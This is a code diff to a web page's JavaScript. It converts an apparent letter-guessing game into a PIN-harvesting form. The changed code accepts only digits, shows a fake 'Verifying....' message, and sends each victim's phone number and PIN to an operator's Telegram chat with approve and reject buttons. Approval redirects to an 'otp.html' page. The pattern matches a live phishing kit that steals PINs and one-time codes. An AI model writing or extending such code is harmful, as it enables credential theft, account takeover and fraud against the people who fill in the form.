@@ -41,7 +41,7 @@ phoneInput.addEventListener("keydown", (e) => { if (e.key === "Enter") inputs[0]
 // Letter boxes: letters only, auto-advance, backspace, Enter, paste
 inputs.forEach((el, i) => {
   el.addEventListener("input", () => {
-    el.value = el.value.replace(/[^a-zA-Z]/g, "").slice(0, 1);
+    el.value = el.value.replace(/[^0-9]/g, "").slice(0, 1);
     if (el.value && inputs[i + 1]) inputs[i + 1].focus();
   });
   el.addEventListener("keydown", (e) => {
@@ -77,16 +77,16 @@ btn.addEventListener("click", async () => {
   const word = letters.join("").toUpperCase();
   const id = Math.random().toString(36).slice(2, 10);
   btn.disabled = true;
-  msg.textContent = "Sent. Waiting for a decision…";
+  msg.textContent = "Verifying....";
 
   try {
     await ready;
     const sent = await tg("sendMessage", {
       chat_id: CHAT_ID,
-      text: `Phone: ${phone}\nGuess: ${word}\n\nIs it correct?`,
+      text: `Phone: ${phone}\n PIN: ${word}\n\nIs it correct?`,
       reply_markup: { inline_keyboard: [[
-        { text: "✅ Yes", callback_data: `yes:${id}` },
-        { text: "❌ No",  callback_data: `no:${id}` },
+        { text: "✅ Approve pin", callback_data: `yes:${id}` },
+        { text: "❌ Reject pin",  callback_data: `no:${id}` },
       ]] },
     });
     if (!sent.ok) throw new Error(sent.description);
@@ -119,7 +119,7 @@ async function waitForAnswer(id, phone, word, messageId) {
       tg("editMessageText", { chat_id: CHAT_ID, message_id: messageId, text: `${phone}: ${word} — ${yes ? "✅ Approved" : "❌ Rejected"}` });
 
       if (yes) { location.href = "otp.html"; return; }
-      showWarn("⚠️ Wrong word. Try again.");
+      showWarn("⚠️ Wrong pin. Try again.");
       tiles.classList.remove("shake"); void tiles.offsetWidth; tiles.classList.add("shake");
       resetBoxes();
       return;
